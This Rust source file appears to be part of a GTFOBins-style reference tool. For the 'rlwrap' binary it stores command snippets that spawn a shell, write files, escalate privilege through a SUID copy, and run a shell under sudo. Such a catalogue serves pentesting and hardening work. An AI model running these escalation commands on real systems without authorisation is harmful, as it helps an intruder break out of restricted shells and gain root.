pub static BIN_NAME: &'static str = "rlwrap";
pub static SH_CODE: &'static str = r#"
    
    rlwrap /bin/sh
"#;
pub static FW_DESC: &'static str =
    "This adds timestamps to the output file. This relies on the external `echo` command.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    rlwrap -l "$LFILE" echo DATA
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which rlwrap) .

    ./rlwrap -H /dev/null /bin/sh -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo rlwrap /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
